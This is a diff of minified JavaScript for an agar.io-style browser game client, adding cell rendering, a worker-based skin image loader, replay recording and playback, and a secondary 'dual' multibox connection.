+                    let t = this.pid;
+                    //h.allCells.forEach(s => {
+                    //    s.isPlayerCell && s.pid === t && (e ? s.addCrown() : s.removeCrown())
+                    //})
+                }
+                createCellContainer() {
+                    let e = new PIXI.Container;
+                    return e.pivot.set(-o / 2), e.addChild(c(this.getCellColor())), e
+                }
+                createSkinSprite(e) {
+                    let t = new PIXI.BaseTexture(e),
+                        s = new PIXI.Texture(t),
+                        i = new PIXI.Sprite(s);
+                    return i.width = i.height = o, i.anchor.set(.5), i
+                }
+                renderCell() {
+                    h.renderer.render(this.cellContainer, this.texture, !0)
+                }
+                setTagId(e) {
+                    return e || (e = null), this.tagId !== e && (this.tagId = e, this.bot || this.setTagSprite(), !0)
+                }
+                setNameColor(e) {
+                    return e = e ? parseInt(e, 16) : null, this.perk_color = e, this.perk_colorCss = e && PIXI.utils.hex2string(e), e
+                }
+                setName(e, t) {
+                    return e || (e = "Unnamed"), (this.nameFromServer !== e || this.color !== t) && (this.nameFromServer = e, this.color = t, this.applyNameToSprite(), !0)
+                }
+                applyNameToSprite() {
+                    let e = "Unnamed" === this.nameFromServer,
+                        t = "Long Name" === this.nameFromServer,
+                        s = e ? "" : this.nameFromServer,
+                        a = this.name,
+                        n = this.perk_color,
+                        o;
+                    if (o = e || t ? this.setNameColor(null) : this.setNameColor(this.bot ? "878787" : this.color), this.setNameSprite(s, o), e || t || !(this.nameSprite.texture.width > i.cellLongNameThreshold) || (t = !0, s = "Long Name", o = this.setNameColor(null), this.setNameSprite(s, o)), this.name = e ? "Unnamed" : s, a !== this.name || n !== this.perk_color) {
+                        let r = o || (this.isMe ? 16747520 : null);
+                        h.events.$emit("minimap-create-node", this.pid, s, o, r)
+                    }
+                }
+                setNameSprite(e, t) {
+                    this.nameSprite ? this.nameSprite.text = e : this.nameSprite = new PIXI.Text(e, i.nameTextStyle), this.nameSprite.style.fill = t || 16777215, this.nameSprite.updateText()
+                }
+                setTagSprite() {
+                    let e = `Team ${null==this.tagId?0:this.tagId}`;
+                    if (this.tagSprite) this.tagSprite.text = e;
+                    else {
+                        let t = {
+                            ...i.nameTextStyle
+                        };
+                        t.fontSize = 50, this.tagSprite = new PIXI.Text(e, t)
+                    }
+                    this.tagSprite.style.fill = this.getTagColor(), this.tagSprite.updateText()
+                }
+                getTagColor() {
+                    if (null != this.tagId) {
+                        let e = [6946705, 6946800, 6908927, 16738803, 16768105, 16738665, 16776960, 65280, 65535, 16711935],
+                            t = h.seededRandom(this.tagId || 0);
+                        return e[Math.floor(t * e.length)]
+                    }
+                    return 16777215
+                }
+                setSkin(e) {
+                    if ((e = e || null) === this.skinUrl) return !1;
+                    this.abortSkinLoaderIfExist();
+                    let t = this.destroySkin();
+                    return t && this.renderCell(), this.skinUrl = e, this.skinShown && this.loadSkinAndRender(), !0
+                }
+                destroySkin() {
+                    return !!this.skinSprite && (this.skinSprite.mask.destroy(!0), this.skinSprite.destroy(!0), this.skinSprite = null, !0)
+                }
+                loadSkinAndRender() {
+                    this.abortSkinLoaderIfExist(), this.abortSkinLoader = h.skinLoader.loadSkin(this.skinUrl, e => {
+                        this.skinSprite = this.createSkinSprite(e), this.skinSprite.mask = c(), this.cellContainer.addChild(this.skinSprite.mask, this.skinSprite), this.renderCell()
+                    })
+                }
+                invalidateVisibility() {
+                    let e, t, s;
+                    this.isMe ? (e = i.showOwnName, t = i.showOwnSkin, s = i.showOwnMass) : (e = i.showNames >= this.visibility, t = i.showSkins >= this.visibility, s = i.showMass >= this.visibility), e = i.namesEnabled && e, t = i.skinsEnabled && t, s = i.massEnabled && s, t && !this.skinShown ? this.skinSprite ? (this.skinSprite.visible = !0, this.renderCell()) : this.skinUrl && this.loadSkinAndRender() : !t && this.skinShown && (this.abortSkinLoaderIfExist(), this.skinSprite && (this.skinSprite.visible = !1, this.renderCell())), this.nameShown = e, this.skinShown = t, this.massShown = s, this.nameColorShown = i.showNameColor
+                }
+                abortSkinLoaderIfExist() {
+                    this.abortSkinLoader && (this.abortSkinLoader(), this.abortSkinLoader = null)
+                }
+                getCellColor() {
+                    let e = h.seededRandom(this.pid),
+                        t = Math.floor(e * a.length);
+                    return (this.bot ? n : a)[t]
+                }
+                clearCachedData() {
+                    this.abortSkinLoaderIfExist(), this.destroySkin(), this.cellContainer.destroy(!0), this.texture.clearedFromCache = !0, this.texture.destroy(!0), this.nameSprite && this.nameSprite.destroy(!0), this.tagSprite && this.tagSprite.destroy(!0), h.events.$emit("minimap-destroy-node", this.pid)
+                }
+            }
+        }, , function(e, t, s) {
+            let i = s(129),
+                a = (e, t) => {
+                    let s = e.callbacks.indexOf(t);
+                    s >= 0 && e.callbacks.splice(s, 1)
+                };
+            e.exports = class e {
+                constructor() {
+                    this.loaders = new Map, this.worker = new i, this.worker.addEventListener("message", this.onSkinLoaded.bind(this))
+                }
+                createLoader(e) {
+                    return {
+                        image: null,
+                        errored: null,
+                        callbacks: [e]
+                    }
+                }
+                clearCallbacks() {
+                    this.loaders.clear()
+                }
+                loadSkin(e, t) {
+                    if (!this.loaders.has(e)) {
+                        let s = this.createLoader(t);
+                        return this.loaders.set(e, s), this.worker.postMessage(e), a.bind(null, s, t)
+                    }
+                    let i = this.loaders.get(e);
+                    if (i.image) t(i.image);
+                    else if (!i.errored) return i.callbacks.push(t), a.bind(null, i, t);
+                    return null
+                }
+                onSkinLoaded(e) {
+                    let {
+                        url: t,
+                        image: s,
+                        errored: i
+                    } = e.data, a = this.loaders.get(t);
+                    if (i) a.errored = !0, a.callbacks = [];
+                    else {
+                        a.image = s;
+                        let {
+                            callbacks: n
+                        } = a;
+                        for (; n.length;) n.pop()(s)
+                    }
+                }
+            }
+        }, function(e, t, s) {
+            let i = atob("YWRkRXZlbnRMaXN0ZW5lcigibWVzc2FnZSIsZT0+e2xldCBzPWUuZGF0YTtmZXRjaChzLHttb2RlOiJjb3JzIn0pLnRoZW4oZT0+ZS5ibG9iKCkpLnRoZW4oZT0+Y3JlYXRlSW1hZ2VCaXRtYXAoZSkpLnRoZW4oZT0+c2VsZi5wb3N0TWVzc2FnZSh7dXJsOnMsaW1hZ2U6ZX0pKS5jYXRjaCgoKT0+c2VsZi5wb3N0TWVzc2FnZSh7dXJsOnMsZXJyb3JlZDohMH0pKX0pOw==");
+            e.exports = function() {
+                return new Worker(URL.createObjectURL(new Blob([i], {
+                    type: "text/javascript"
+                })))
+            }
+        }, function(e, t, i) {
+            let a = i(131),
+                n = i(1),
+                {
+                    getTimestamp: o
+                } = i(8),
+                r = i(5),
+                l = i(4),
+                c = i(78),
+                h = a.createInstance({
+                    name: "game-replays"
+                }),
+                d = e => btoa(String.fromCharCode.apply(null, new Uint8Array(e))),
+                p = e => {
+                    e = atob(e);
+                    let t = e.length,
+                        s = new ArrayBuffer(t),
+                        i = new Uint8Array(s);
+                    for (let a = 0; a < t; a++) i[a] = e.charCodeAt(a);
+                    return s
+                },
+                u = d(new ArrayBuffer(1)),
+                g = e => {
+                    let t = e.map(e => {
+                            let t = {
+                                pid: e.pid,
+                                nickname: e.nameFromServer,
+                                skinUrl: e.skinUrl,
+                                perk_color:e.perk_color
+                            };
+                            return e.bot && (t.bot = !0), e.tagId && (t.tagId = e.tagId), e.perk_color && (t.perk_color = e.perk_color), t
+                        }),
+                        i = JSON.stringify(t);
+                    i = unescape(encodeURIComponent(i));
+                    let a = s.fromSize(1 + i.length + 1);
+                    return a.writeUInt8(16), a.writeStringNT(i), d(a.buffer)
+                },
+                A = e => {
+                    let t = 0,
+                        i = e.length;
+                    for (let a = 0; a < i; a++) {
+                        let n = e[a];
+                        t += 1 + (1 === n.type ? 2 : 0) + 2 + 2 + 2 + 2 + (n.flags ? 1 : 0)
+                    }
+                    let o = s.fromSize(1 + t + 1 + 2 + 2);
+                    o.writeUInt8(10);
+                    for (let r = 0; r < i; r++) {
+                        let l = e[r],
+                            c = 254 & l.flags;
+                        o.writeUInt8(l.type | (c ? 128 : 0)), 1 === l.type && o.writeUInt16BE(l.pid), o.writeUInt16BE(l.id), o.writeInt16BE(l.x), o.writeInt16BE(l.y), o.writeUInt16BE(l.size), c && o.writeUInt8(c)
+                    }
+                    return o.writeUInt8(0), o.writeUInt16BE(0), o.writeUInt16BE(0), o.view
+                };
+            n.replay = new class e {
+                constructor() {
+                    this.cells = [
+                        [],
+                        []
+                    ], this.packets = [
+                        [],
+                        []
+                    ], this.database = h
+                }
+                recording() {
+                    let e = this.packets[0];
+                    return 0 != e.length
+                }
+                add(e, t) {
+                    let s = this.cells[+t],
+                        i = this.packets[+t],
+                        a = [...(t ? n.dual : n).cells.values()];
+                    s.push(a.map(e => ({
+                        type: e.type,
+                        id: e.id,
+                        pid: e.pid,
+                        x: e.nx,
+                        y: e.ny,
+                        size: e.nSize,
+                        flags: e.flags
+                    }))), i.push(e);
+                    let o = 25 * l.replayDuration;
+                    i.length > o && (i.shift(), s.shift())
+                }
+                clear(e) {
+                    let t = this.cells[+e],
+                        s = this.packets[+e];
+                    t.length = 0, s.length = 0
+                }
+                play(e) {
+                    n.running && n.stop(), n.connection.close(), r.toast.close();
+                    let t = 1,
+                        i = e.split("|");
+                    "REPLAY" === i.at(0) && (t = parseInt(i[1]), i = i.slice(3));
+                    let a = i.map(e => s.fromBuffer(p(e), 1)),
+                        o = c(a.shift()),
+                        l = [];
+                    if (t >= 4) {
+                        let h;
+                        for (;
+                            (h = a[0]).readUInt8(0);) {
+                            let {
+                                view: d
+                            } = h;
+                            d.packetId = 1, h.offset = 0, l.push(h), a.shift()
+                        }
+                        a.shift()
+                    } else l.push(a.shift());
+                    o.replayUpdates = a, n.start(o), l.forEach(e => n.parseMessage(e)), n.playback.setStartingFrame(), n.showMenu(!1)
+                }
+                save(e) {
+                    let t = this.cells[+e].slice(0),
+                        i = this.packets[+e].slice(0);
+                    if (!i.length) return;
+                    let a = [...n.playerManager.players.values()];
+                    i.splice(0, 1, A(t.at(0)));
+                    let c = ["REPLAY", 4];
+                    c.push(n.createThumbnail()), c.push(d(n.initialDataPacket.buffer));
+                    let {
+                        dual: p
+                    } = n;
+                    if (p.connected) {
+                        let m = s.fromSize(3);
+                        m.writeUInt8(8), m.writeUInt16LE(p.pid), c.push(d(m.buffer))
+                    }
+                    c.push(g(a)), c.push(u), c.push(i.map(e => d(e.buffer)).join("|"));
+                    let v = c.join("|");
+                    h.setItem(o(), v, () => {
+                        n.events.$emit("replay-added");
+                        let e = "Replay saved!";
+                        1 === l.showReplaySaved ? n.events.$emit("chat-message", e) : r.toast.fire({
+                            type: "info",
+                            title: e,
+                            timer: 1500
+                        })
+                    }).catch(e => {
+                        console.error("ReplayManager::save", e);
+                        let t = "Error saving replay";
+                        "string" == typeof e ? t += `: ${e}` : e && e.message && (t += `: ${e.message}`), r.toast.fire({
+                            type: "error",
+                            title: t
+                        })
+                    })
+                }
+            }
+        }, , function(e, t, s) {
+            let i = s(1),
+                {
+                    wasmModule: a,
+                    addOrUpdateCell: n,
+                    destroyCell: o,
+                    eatCell: r
+                } = s(79);
+            e.exports = i.playback = new class e {
+                constructor() {
+                    this.updates = [], this.dry = !1, this.index = 0
+                }
+                destroyCell(e) {
+                    let {
+                        updates: t
+                    } = this, s = t[0];
+                    s[3][e] = !0;
+                    let i = s[1];
+                    i.push(e)
+                }
+                eatCell(e, t) {
+                    let {
+                        updates: s
+                    } = this, i = s[0];
+                    i[3][e] = !0;
+                    let a = i[2];
+                    a.push(e, t)
+                }
+                parse(e) {
+                    a.deserialize(1, new Uint8Array(e.buffer, 1), 1)
+                }
+                reset() {
+                    let {
+                        updates: e
+                    } = this;
+                    e.splice(0, e.length), delete e.index
+                }
+                set(e) {
+                    this.reset(), this.dry = !0;
+                    let {
+                        updates: t
+                    } = this, s = e.length, i = 0;
+                    for (; s--;) t.unshift([{},
+                        [],
+                        [], {}
+                    ]), this.parse(e[i++]);
+                    t.reverse(), delete this.dry, this.index = 0
+                }
+                setStartingFrame() {
+                    let {
+                        cells: e
+                    } = i, {
+                        updates: t
+                    } = this, [s, a, n, o] = t;
+                    for (let r of e.keys()) {
+                        let l = e.get(r);
+                        r in o || (r in s ? s[r].pid = l.pid : s[r] = {
+                            type: l.type,
+                            id: l.id,
+                            pid: l.pid,
+                            x: l.nx,
+                            y: l.ny,
+                            size: l.nSize,
+                            flags: l.flags
+                        })
+                    }
+                    for (let c = 1; c < t.length; c++) {
+                        let h = t[c - 1],
+                            d = t[c];
+                        for (let p in d[0]) {
+                            if (!(p in h[0])) continue;
+                            let u = d[0][p],
+                                g = h[0][p];
+                            16 & u.type && (u.pid = g.pid), 32 & u.type && (u.x = g.x, u.y = g.y), 64 & u.type && (u.size = g.size)
+                        }
+                        for (let A in h[0]) A in d[3] || A in d[0] || (d[0][A] = h[0][A])
+                    }
+                }
+                seek(e, t) {
+                    let {
+                        cells: s
+                    } = i, a = this.updates[e];
+                    for (let r of s.keys()) !t && r in a[0] || o(r, 1);
+                    for (let l of Object.values(a[0])) {
+                        let {
+                            type: c,
+                            pid: h,
+                            id: d,
+                            x: p,
+                            y: u,
+                            size: g,
+                            flags: A
+                        } = l;
+                        n(c, h, d, p, u, g, A, 1, 1)
+                    }
+                    this.index = e, i.updateCamera(!0)
+                }
+                next() {
+                    let {
+                        updates: e
+                    } = this;
+                    if (this.index < e.length) {
+                        let [t, s, a] = e[this.index++];
+                        for (let l of Object.values(t)) {
+                            let {
+                                type: c,
+                                pid: h,
+                                id: d,
+                                x: p,
+                                y: u,
+                                size: g,
+                                flags: A
+                            } = l;
+                            n(c, h, d, p, u, g, A, 1, 1)
+                        }
+                        let m = s.length,
+                            v = 0;
+                        for (; v < m;) o(s[v++], 1);
+                        for (m = a.length, v = 0; v < m;) r(a[v++], a[v++], 1);
+                        i.updateCamera(!0)
+                    } else this.seek(0, !0);
+                    i.events.$emit("replay-index-change", this.index)
+                }
+            }
+        }, function(e, t, s) {
+            e.exports = {
+                PlayerCell: s(134),
+                Food: s(135),
+                Virus: s(136),
+                EjectedMass: s(137),
+                DeadCell: s(138),
+                Crown: s(139)
+            }
+        }, function(e, t, s) {
+            let i = s(1),
+                a = s(4),
+                o = s(14),
+                r = e => {
+                    let t = new PIXI.BitmapText("", {
+                            fontName: "mass",
+                            align: "right"
+                        }),
+                        s = e.strokeThickness || 0;
+                    return t.position.set(-s / 2, -s / 2), t.anchor.set(.5, -.6), t
+                };
+            class l extends PIXI.Graphics {
+                constructor(e) {
+                    super(), this.alpha = .35, this.updatePoints(e)
+                }
+                updatePoints(e, t, s, i) {
+                    e && t && s && i && (this.clear(), this.lineStyle(12, 16777215), this.moveTo(e, t), this.lineTo(s, i))
+                }
+            }
+            class c extends o {
+                constructor(e, t) {
+                    super(e), this.player = t, this.pid = t.pid;
+                    let s = this.isMe = this.pid == i.playerId || this.pid === i.multiboxPid,
+                        {
+                            ownedCells: a
+                        } = i;
+                    s && !a.has(this) && a.add(this), t.hasCrown && this.addCrown(), !i.replaying && s && (this.addArrow(), this.addLine())
+                }
+                updateLineVisibility() {
+                    let {
+                        line: e
+                    } = this;
+                    if (e) {
+                        if (a.showCellLines) {
+                            let {
+                                dual: t
+                            } = i;
+                            t.connected ? e.visible = this.pid === i.activePid : e.visible = !0
+                        } else e.visible = !1
+                    }
+                }
+                addLine() {
+                    let {
+                        x: e,
+                        y: t
+                    } = i.mouse;
+                    this.line = new l([this.x, this.y, e, t]), i.scene.container.addChild(this.line), this.updateLineVisibility()
+                }
+                addArrow() {
+                    let {
+                        dual: e
+                    } = i;
+                    if (!e.arrowSprite) {
+                        console.error("Arrow sprite not set?");
+                        return
+                    }
+                    let t = this.arrowSprite = new PIXI.Sprite.from(e.arrowSprite.texture);
+                    t.visible = a.mbActive >= 2 && this.pid === i.activePid, t.anchor.set(.5), t.width = t.height = 130, t.alpha = .95, t.y = -310, this.sprite.addChild(t)
+                }
+                addCrown() {
+                    if (this.crownSprite) return;
+                    let e = i.crownPool,
+                        t;
+                    e.length ? t = e.pop() : ((t = PIXI.Sprite.from("/img/crown.png")).scale.set(.7), t.pivot.set(0, 643), t.anchor.x = .5, t.rotation = -.5, t.alpha = .7, t.zIndex = 2), this.crownSprite = t, this.sprite.addChild(t)
+                }
+                removeCrown() {
+                    let e = this.crownSprite;
+                    e && (this.sprite.removeChild(e), i.crownPool.push(e), this.crownSprite = null)
+                }
+                onUpdate() {
+                    if (a.showDir && !this.directionSprite) {
+                        let e = this.directionSprite = new PIXI.Sprite.from("https://i.postimg.cc/vmZmWCRR/4-Point-Star.png");
+                        e.scale.set(.1), e.alpha = .7, e.anchor.set(3.5, 3.5), this.sprite.addChild(e)
+                    }
+                    let t = i.scene.container.scale.x * this.size * i.renderer.resolution,
+                        s = t > a.smallTextThreshold,
+                        {
+                            player: o
+                        } = this;
+                    if (o.massShown && !this.massText && s && (this.massText = i.massTextPool.pop() || r(a.massTextStyle), this.massText.zIndex = 0, this.sprite.addChild(this.massText)), o.nameShown && !this.nameSprite && o.nameSprite && s && (this.nameSprite = new PIXI.Sprite(o.nameSprite.texture), this.nameSprite.anchor.set(.5), this.nameSprite.zIndex = 1, this.sprite.addChild(this.nameSprite)), a.showTag && !this.tagSprite && o.tagSprite && (o.tagId !== i.tagId || null === i.tagId)) {
+                        let l = this.tagSprite = new PIXI.Sprite(o.tagSprite.texture);
+                        l.anchor.set(.5), l.y = 180, l.zIndex = 1, this.sprite.addChild(l)
+                    }
+                    let {
+                        line: c
+                    } = this;
+                    if (c && c.visible) {
+                        let {
+                            x: h,
+                            y: d
+                        } = i.mouse;
+                        c.updatePoints(this.x, this.y, h, d)
+                    }
+                    this.crownSprite && (this.crownSprite.visible = t > 16 && a.showCrown), this.nameSprite && (this.nameSprite.visible = o.nameShown && s), this.tagSprite && (this.tagSprite.visible = a.showTag);
+                    let {
+                        directionSprite: p
+                    } = this;
+                    if (p && (p.visible = a.showDir && !o.isMe)) {
+                        let u = 0,
+                            g = !1,
+                            {
+                                ox: A,
+                                oy: m,
+                                nx: v,
+                                ny: f
+                            } = this;
+                        v > A ? (v - A < 3 && (g = !0), u = f < m ? g ? 0 : m - f < 3 ? 2 : 1 : g ? 4 : f - m < 3 ? 2 : 3) : (A - v < 3 && (g = !0), u = f < m ? g ? 0 : m - f < 3 ? 6 : 7 : g ? 4 : f - m < 3 ? 6 : 5), p.rotation = n[u]
+                    }
+                    let {
+                        massText: C
+                    } = this;
+                    if (C) {
+                        if (o.massShown && s) {
+                            let y = i.getMassText(this.nSize * this.nSize / 100);
+                            C.text = y, C.visible = !0
+                        } else C.visible && (C.visible = !1)
+                    }
+                }
+                onDestroy() {
+                    this.arrowSprite && (this.sprite.removeChild(this.arrowSprite), this.arrowSprite.destroy(), delete this.arrowSprite), this.tagSprite && (this.sprite.removeChild(this.tagSprite), this.tagSprite.destroy(), delete this.tagSprite), this.directionSprite && (this.sprite.removeChild(this.directionSprite), this.directionSprite.destroy(), delete this.directionSprite), this.line && (i.scene.container.removeChild(this.line), this.line.destroy(), delete this.line), this.massText && (this.sprite.removeChild(this.massText), i.massTextPool.push(this.massText)), this.crownSprite && this.removeCrown()
+                }
+            }
+            c.prototype.type = 1, c.prototype.isPlayerCell = !0, e.exports = c
+        }, function(e, t, s) {
+            let i = s(4),
+                {
+                    cells: a
+                } = s(12),
+                {
+                    neon: n
+                } = s(76),
+                o = s(14),
+                r = e => a.getTexture(i.useFoodColor ? parseInt(i.foodColor, 16) : n[e % n.length]);
+            class l extends o {
+                constructor(e) {
+                    e.texture = r(e.id), super(e)
+                }
+                reloadTexture() {
+                    this.sprite.texture = this.texture = r(this.id)
+                }
+            }
+            l.prototype.type = 4, l.prototype.isFood = !0, e.exports = l
+        }, function(e, t, s) {
+            let i = s(14),
+                {
+                    virus: a
+                } = s(12);
+            class n extends i {
+                constructor(e) {
+                    e.texture = a.getTexture(), super(e)
+                }
+                resetTexture() {
+                    this.destroySprite(), this.texture = a.getTexture(), this.sprite = new PIXI.Sprite(this.texture), this.sprite.anchor.set(.5), this.sprite.gameData = this
+                }
+            }
+            n.prototype.type = 2, n.prototype.isVirus = !0, e.exports = n
+        }, function(e, t, s) {
+            let i = s(1),
+                a = s(4),
+                {
+                    cells: n
+                } = s(12),
+                o = s(14),
+                r = () => n.getTexture(parseInt(a.ejectedColor, 16)),
+                {
+                    clampNumber: l
+                } = s(8);
+            class c extends o {
+                constructor(e) {
+                    e.texture = r(), super(e), this.sprite.alpha = 0
+                }
+                reloadTexture() {
+                    
+                    this.sprite.texture = this.texture = r(this.id)
+                }
+                onUpdate() {
+                    let {
+                        sprite: e
+                    } = this;
+                    if (!e || 1 == e.alpha) return;
+                    let t = i.timeStamp - this.updateStamp,
+                        s = l(t / 1e3, 0, 1);
+                    e.alpha = Math.min(e.alpha + s, 1)
+                }
+            }
+            c.prototype.type = 3, c.prototype.isEjected = !0, e.exports = c
+        }, function(e, t, s) {
+            let i = s(14),
+                {
+                    squares: a,
+                    cells: n
+                } = s(12);
+            class o extends i {
+                constructor(e, t, s) {
+                    e.texture = (s ? a : n).getTexture(t || 4210752), super(e), this.sprite.alpha = .1
+                }
+            }
+            o.prototype.type = 5, o.prototype.isDead = !0, e.exports = o
+        }, function(e, t, s) {
+            let i = s(14);
+            class a extends i {
+                constructor(e) {
+                    e.texture = PIXI.Texture.from("/img/crown.png"), super(e), this.sprite.alpha = .3
+                }
+            }
+            a.prototype.type = 6, a.prototype.isCrown = !0, e.exports = a
+        }, function(e, t, s) {}, function(e, t, s) {}, function(e, t, i) {
+            let n = i(1),
+                {
+                    state: o
+                } = n,
+                r = i(78),
+                {
+                    wasmModule: l
+                } = i(79);
+            e.exports = n.dual = new class e {
+                constructor() {
+                    this.ws = null, this.focused = !1, this.opened = !1, this.pid = null, this.pingStamp = 0, this.autoRespawning, this.alive, this.ticksSinceDeath = 0, this.cells = new Map, this.arrowSprite = null, this.reloadArrow()
+                }
+                log(e) {
+                    n.events.$emit("chat-message", e)
+                }
+                get connected() {
+                    return this.opened && !!this.ready
+                }
+                open() {
+                    let {
+                        connectionUrl: e
+                    } = o;
+                    if (!e) return;
+                    let t = this.ws = new WebSocket(e, "tFoL46WDlZuRja7W6qCl");
+                    t.binaryType = "arraybuffer", t.packetCount = 0, this.opened = !0, t.onopen = () => {
+                        this.opened && (this.ws.onclose = this.onClosed.bind(this), this.reloadArrow())
+                    }, t.onmessage = e => {
+                        let {
+                            data: t
+                        } = e;
+                        n.nwData += t.byteLength, this.handleMessage(new DataView(t))
+                    }, t.onclose = this.onRejected.bind(this)
+                }
+                close() {
+                    let {
+                        ws: e
+                    } = this;
+                    e && (e.onmessage = null, e.onclose = null, e.onerror = null, e.close(), this.ws = null), this.focused = !1, this.opened = !1, this.pid = n.multiboxPid = null, this.pingStamp = 0, delete this.alive, this.ticksSinceDeath = 0, delete this.ready, this.clearCells(), this.feedTimeout && (clearTimeout(this.feedTimeout), delete this.feedTimeout)
+                }
+                onRejected() {
+                    let e = atob("RHVhbCBmYWlsZWQgdG8gY29ubmVjdA==");
+                    this.log(e)
+                }
+                onClosed(e) {
+                    let t = "Dual disconnected";
+                    e.reason && (t += ` (${e.reason})`), this.log(t), this.close()
+                }
+                parseCells(e) {
+                    l.deserialize(2, new Uint8Array(e.buffer, 1), this.ws.packetCount++)
+                }
+                handleMessage(e) {
+                    let t = new s(e),
+                        i = t.readUInt8();
+                    switch (i) {
+                        case 1: {
+                            let o = r(t);
+                            n.multiboxPid = this.pid = o.playerId, this.log("Dual connected"), setTimeout(() => {
+                                this.ready = !0;
+                                let e = n.playerManager.getPlayer(this.pid);
+                                e.isMe = !0, n.replay.clear(!1)
+                            }, 500);
+                            return
+                        }
+                        case 2: {
+                            let l = new Uint8Array(e.buffer, 1);
+                            n.connection.sendJoinData(new a(l).build(), !0);
+                            return
+                        }
+                        case 6:
+                            n.connection.sendOpcode(6, !0);
+                            return;
+                        case 10: {
+                            n.timeStamp = performance.now(), this.parseCells(t), n.updateStates(!1);
+                            let c = this.alive,
+                                {
+                                    replay: h
+                                } = n;
+                            if (c ? h.add(e, !0) : n.alive || h.clear(!0), !this.alive && this.autoRespawning && 37 == ++this.ticksSinceDeath && n.triggerAutoRespawn(!0), !this.focused) return;
+                            n.updateCamera(!0);
+                            return
+                        }
+                        case 18: {
+                            let {
+                                replay: d
+                            } = n;
+                            d.clear(!0), this.clearCells();
+                            return
+                        }
+                        case 20:
+                            n.handleDeath(t, !0);
+                            return;
+                        case 22:
+                            n.events.$emit("m-show-image-captcha");
+                            return
+                    }
+                }
+                ping() {
+                    this.pingStamp = performance.now(), n.connection.sendOpcode(3, !0)
+                }
+                spawn() {
+                        console.log("spawn");
+                    this.connected && (n.actions.join(!0), this.updateOutlines())
+                }
+                updateOutlines() {
+                    let e = n.playerId,
+                        t = this.pid,
+                        {
+                            players: s
+                        } = n.playerManager;
+                    if (!s.has(e) || !s.has(t)) return;
+                    let i = s.get(e),
+                        a = s.get(t),
+                        o = [];
+                    switch (n.allCells.forEach(e => {
+                            e.pid && e.isMe && e.arrowSprite && o.push(e)
+                        }), settings.mbActive) {
+                        case 0:
+                            break;
+                        case 1: {
+                            o.length > 0 && o.forEach(e => {
+                                e.arrowSprite.visible = !1
+                            });
+                            let r = +("0x" + settings.mbColor);
+                            this.focused ? (i.setOutline(16777215), a.setOutline(r)) : (a.setOutline(16777215), i.setOutline(r));
+                            break
+                        }
+                        case 2:
+                        case 3:
+                            i.outlineGraphic && i.setOutline(0, 0, !0), a.outlineGraphic && a.setOutline(0, 0, !0), o.forEach(e => {
+                                e.arrowSprite.visible = e.pid === n.activePid
+                            })
+                    }
+                    settings.showCellLines && n.allCells.forEach(e => {
+                        e.line && e.updateLineVisibility()
+                    })
+                }
+                reloadArrow() {
+                    if (this.arrowSprite && this.arrowSprite.destroy(), settings.mbArrow.startsWith("data:image")) {
+                        let e = document.createElement("img");
+                        e.src = settings.mbArrow;
+                        let t = new PIXI.BaseTexture(e),
+                            s = new PIXI.Texture(t);
+                        this.arrowSprite = new PIXI.Sprite(s)
+                    } else this.arrowSprite = new PIXI.Sprite.from(settings.mbArrow)
+                }
+                get position() {
+                    let e = 0,
+                        t = 0,
+                        s = [...this.cells.values()].filter(e => e.pid && e.pid == this.pid && !!e.sprite);
+                    if (0 == s.length) return [];
+                    s.forEach(({
+                        x: s,
+                        y: i
+                    }) => {
+                        e += s, t += i
+                    });
+                    let i = s.length;
+                    return [e / i, t / i]
+                }
+                get ownerPosition() {
+                    let e = 0,
+                        t = 0,
+                        s = [...n.cells.values()].filter(e => e.pid && e.pid == n.playerId && !!e.sprite);
+                    if (0 == s.length) return [];
+                    s.forEach(({
+                        x: s,
+                        y: i
+                    }) => {
+                        e += s, t += i
+                    });
+                    let i = s.length;
+                    return [e / i, t / i]
+                }
+                getDistanceFromOwner() {
+                    let [e, t] = this.position;
+                    if (void 0 == e) return null;
+                    let [s, i] = this.ownerPosition;
+                    return null == s ? null : Math.hypot(s - e, i - t)
+                }
+                clearCells() {
+                    this.cells.forEach(e => e.destroy(2));
+                    let {
+                        destroyedCells: e
+                    } = n, t = e.length;
+                    for (; t--;) {
+                        let s = e[t];
+                        s.destroySprite(), e.splice(t, 1)
+                    }
+                }
+                switch () {
+                    //console.log(this);
+                    this.updateOutlines();
+                    if (n.spectating && (n.spectating = !1), !this.opened) return void this.open();
+                    if (!this.ready) return;
+                    let e = this.focused;
+                    this.feedTimeout && (clearTimeout(this.feedTimeout), delete this.feedTimeout), settings.rememeberEjecting || (this.feedTimeout = setTimeout(() => {
+                        if (n.isAlive(e)) {
+                            let t = s.fromSize(2);
+                            t.writeUInt8(21), t.writeUInt8(0), n.connection.send(t, e)
+                            console.log("alive");
+                        }
+                    }, 120)), e ? (n.isAlive(!1) || o.autoRespawning || n.actions.join(), n.activePid = n.playerId, this.focused = !1) : (n.isAlive(!0) || this.autoRespawning || this.spawn(), n.activePid = this.pid, this.focused = !0), this.updateOutlines();
+                console.log(`e ? (n.isAlive(!1), o.autoRespawning) : (n.isAlive(!0) , this.autoRespawning , "this.spawn()")`);
+                e ? console.log(n.isAlive(!1), o.autoRespawning) : console.log(n.isAlive(!0) , this.autoRespawning , "this.spawn()");
+                }
+            }
+        }, function(e, t, s) {}, function(e) {
+            e.exports = function(e) {
+                var t = 1,
+                    s = e.getInt16(t, !0);
+                t += 2;
+                for (var i = "", a = ""; 0 != (a = e.getUint16(t, !0));) t += 2, i += String.fromCharCode(a);
+                return {
+                    pid: s,
+                    text: i
+                }
+            }
+        }, function(e) {
+            e.exports = function(e) {
+                for (var t = 1, s = [];;) {
+                    var i = e.getUint16(t, !0);
+                    if (t += 3, !i) break;
+                    var a = e.getUint8(t, !0) / 255;
+                    t += 1;
+                    var n = e.getUint8(t, !0) / 255;
+                    t += 1, s.push({
+                        pid: i,
+                        x: a,
+                        y: n
+                    })
+                }
+                return s
+            }
+        }, function(e) {
+            e.exports = function(e, t) {
+                for (var s = 1, i = [];;) {
+                    var a = t.getUint16(s, !0);
+                    if (s += 2, !a) break;
+                    var n = e.playerManager.getPlayer(a);
+                    n && i.push({
+                        pid: a,
+                        position: 1 + i.length,
+                        text: n.name,
+                        perk_color: n.perk_colorCss || "#ffffff",
+                        bold: !!n.perk_color
+                    })
+                }
+                return i
+            }
+        }, function(e) {
+            e.exports = window.WebSocket
+        }, function(e, t, s) {
+            let i = s(1);
+            s(149);
+            let a = s(66),
+                n = i.renderer.view,
+                o = a.pressed = new Set;
+            window.addEventListener("blur", () => {
+                o.clear()
+            });
+            let r = /firefox/i.test(navigator.userAgent) ? "DOMMouseScroll" : "wheel",
+                l = e => {
+                    let t = i.actions.findPlayerUnderMouse(),
+                        s = t && t.player;
+                    s && i.events.$emit("context-menu", e, s)
+                },
+                c = () => {
